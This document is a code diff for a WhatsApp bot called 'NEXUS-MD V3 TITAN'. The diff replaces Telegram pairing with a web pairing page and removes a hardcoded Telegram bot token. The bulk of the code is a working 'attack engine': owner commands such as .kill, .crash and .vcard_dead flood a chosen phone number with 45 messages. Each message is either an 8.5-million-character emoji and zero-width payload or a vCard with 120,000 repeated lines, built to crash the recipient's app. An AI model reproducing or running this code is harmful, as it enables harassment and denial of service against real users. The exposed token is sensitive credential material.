@@ -2,38 +2,54 @@ const {
     default: makeWASocket, 
     useMultiFileAuthState, 
     delay,
-    makeCacheableSignalKeyStore
+    makeCacheableSignalKeyStore,
+    fetchLatestBaileysVersion
 } = require("@whiskeysockets/baileys");
-const TelegramBot = require('node-telegram-bot-api');
 const pino = require('pino');
 const express = require('express');
-
-// --- ⚙️ TITAN CONFIG ---
-const TG_TOKEN = '8246779983:AAEDuC8a7QMd2OwNvLDJvDGGwLkFk5nc9k8'; 
-
-// 🔥 FIXED: මැසේජ් පෝලිම පාලනය කරන අලුත්ම සෙටින්ග්ස්
-const tgBot = new TelegramBot(TG_TOKEN, { 
-    polling: { 
-        params: { 
-            drop_pending_updates: true, // පරණ මැසේජ් ඔක්කොම අයින් කරනවා
-            timeout: 10
-        } 
-    } 
-});
+const path = require('path');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
-let botConfig = { owner: "94767475809", prefix: "." };
 
-app.get('/', (req, res) => res.send('TITAN ZERO-LOOP ACTIVE 🛡️'));
-app.listen(PORT, () => console.log(`Stable Server on ${PORT}`));
+let botConfig = {
+    botName: "NEXUS-MD V3 TITAN",
+    owner: "94767475809", 
+    prefix: ".",
+};
 
-// --- 🛡️ DOUBLE-LOCK SYSTEM ---
-const processedMsgs = new Set();
+// --- 🌐 WEB INTERFACE FOR PAIRING (NO TELEGRAM NEEDED) ---
+app.get('/', (req, res) => {
+    res.send(`
+        <body style="background: #000; color: #0f0; font-family: monospace; text-align: center; padding-top: 50px;">
+            <h1 style="text-shadow: 0 0 10px #0f0;">🔱 NEXUS-MD V3 TITAN 🔱</h1>
+            <p>Master: Sasiya MD | Status: <span style="color: white;">TITAN ENGINE ACTIVE</span></p>
+            <hr style="border: 1px solid #333; width: 50%;">
+            <div style="margin-top: 30px;">
+                <input type="text" id="number" placeholder="9476xxxxxxx" style="padding: 10px; border: 1px solid #0f0; background: #000; color: #0f0;">
+                <button onclick="getPairing()" style="padding: 10px; background: #0f0; color: #000; border: none; cursor: pointer; font-weight: bold;">GET TITAN KEY</button>
+            </div>
+            <h2 id="pairCode" style="margin-top: 40px; font-size: 40px; letter-spacing: 5px;"></h2>
+            <script>
+                async function getPairing() {
+                    const num = document.getElementById('number').value;
+                    if(!num) return alert('Enter Number!');
+                    document.getElementById('pairCode').innerText = "CONNECTING...";
+                    const res = await fetch('/pair?num=' + num);
+                    const data = await res.json();
+                    document.getElementById('pairCode').innerText = data.code || "ERROR!";
+                }
+            </script>
+        </body>
+    `);
+});
 
 async function startNexus() {
     const { state, saveCreds } = await useMultiFileAuthState('nexus_session');
+    const { version } = await fetchLatestBaileysVersion();
+
     const sock = makeWASocket({
+        version,
         auth: {
             creds: state.creds,
             keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "silent" })),
@@ -43,63 +59,58 @@ async function startNexus() {
         syncFullHistory: false
     });
 
-    // --- 🤖 STABLE TELEGRAM HANDLER ---
-    tgBot.on('message', async (msg) => {
-        const chatId = msg.chat.id;
-        const text = msg.text;
-        const mId = msg.message_id;
-
-        // 🛑 LOCK 1: බොට්ගේ මැසේජ්ද කියලා බලනවා
-        if (msg.from.is_bot) return;
-
-        // 🛑 LOCK 2: මේ මැසේජ් එක දැනටමත් රන් වෙනවද කියලා බලනවා
-        if (processedMsgs.has(mId)) return;
-        processedMsgs.add(mId);
-
-        // --- 🔑 PAIRING CODE LOGIC ---
-        if (text === '/start') {
-            await tgBot.sendMessage(chatId, "🔱 *NEXUS TITAN ZERO-LOOP*\n\nStatus: *100% Stable*\nMaster: *Sasiya MD*");
-        } else if (text && /^\d+$/.test(text) && text.length > 9) {
-            try {
-                let code = await sock.requestPairingCode(text.trim());
-                await tgBot.sendMessage(chatId, `⚡ *TITAN KEY:* \`${code}\``, { parse_mode: 'Markdown' });
-            } catch (e) {
-                console.log("Pairing Error");
-            }
+    // --- 🔑 WEB PAIRING ENDPOINT ---
+    app.get('/pair', async (req, res) => {
+        let num = req.query.num;
+        if (!num) return res.json({ error: "No Number" });
+        try {
+            let code = await sock.requestPairingCode(num.replace(/[^0-9]/g, ''));
+            res.json({ code: code });
+        } catch (e) {
+            res.json({ error: "Try Again" });
         }
-
-        // තත්පර 30කට පස්සේ විතරක් ID එක අයින් කරනවා (ආයේ එන එක නවත්තන්න)
-        setTimeout(() => processedMsgs.delete(mId), 30000);
     });
 
-    // --- 📩 WHATSAPP BUG ENGINE (8.5M) ---
+    // --- ☣️ GLOBAL 8.5M TITAN PAYLOADS ---
+    const p_titan = "☠️".repeat(1000000) + "​".repeat(7500000); 
+    const p_vcard = "BEGIN:VCARD\nVERSION:3.0\nN:;Titan-Nexus;;;\nFN:Titan\n" + "TEL;type=CELL;waid=94767475809:".repeat(120000) + "\nEND:VCARD"; 
+
+    // --- 📩 TITAN ATTACK ENGINE ---
     sock.ev.on('messages.upsert', async (m) => {
         try {
             const mek = m.messages[0];
             if (!mek.message || mek.key.fromMe) return;
             const from = mek.key.remoteJid;
-            if (!from.startsWith(botConfig.owner)) return;
+            if (!from.startsWith(botConfig.owner)) return; 
 
             const body = (mek.message.conversation || mek.message.extendedTextMessage?.text || "").trim();
             if (!body.startsWith(botConfig.prefix)) return;
 
             const command = body.slice(1).trim().split(/ +/).shift().toLowerCase();
             const args = body.trim().split(/ +/).slice(1);
-            const targetJid = args[0] ? args[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : null;
-
-            // ☣️ POWER PAYLOADS
-            const p_titan = "☠️".repeat(1000000) + "​".repeat(7500000);
+            const target = args[0] ? args[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : null;
 
             if (command === 'menu') {
-                const mText = `┏━━━━━━━━━━━━━━━━━┓\n┃  🔱 NEXUS TITAN 8.5M 🔱\n┗━━━━━━━━━━━━━━━━━┛\n\n☠️ .kill [num]\n🔥 .crash [num]\n💀 .destroy [num]\n📍 .loc_kill [num]\n📇 .vcard_dead [num]`;
-                await sock.sendMessage(from, { text: mText });
-            } else if (['kill', 'crash', 'destroy', 'loc_kill', 'vcard_dead'].includes(command)) {
-                if (!targetJid) return;
+                const menu = `
+┏━━━━━━━━━━━━━━━━━━━━━┓
+┃  🔱 *NEXUS TITAN V3* 🔱
+┗━━━━━━━━━━━━━━━━━━━━━┛
+┃ 🩸 *POWER:* 8.5M Stress
+┃ ☠️ *.kill* [num]
+┃ 🔥 *.crash* [num]
+┃ 📇 *.vcard_dead* [num]
+┃ 📍 *.loc_kill* [num]
+┃ 🌀 *.wipe* [jid]
+┗━━━━━━━━━━━━━━━━━━━━━┛`;
+                await sock.sendMessage(from, { text: menu });
+            }
+
+            if (['kill', 'crash', 'vcard_dead', 'loc_kill'].includes(command)) {
+                if (!target) return;
                 await sock.sendMessage(from, { text: `🔱 *TITAN ATTACKING:* ${args[0]}` });
-                
                 for(let i=0; i<45; i++) {
-                    // Attack Logic...
-                    await sock.sendMessage(targetJid, { text: p_titan });
+                    let payload = command === 'vcard_dead' ? p_vcard : p_titan;
+                    await sock.sendMessage(target, { text: payload });
                     await delay(80);
                 }
             }
@@ -110,4 +121,7 @@ async function startNexus() {
     sock.ev.on('creds.update', saveCreds);
 }
 
-startNexus();
+app.listen(PORT, () => {
+    console.log(`Titan Dashboard: http://localhost:${PORT}`);
+    startNexus();
+});
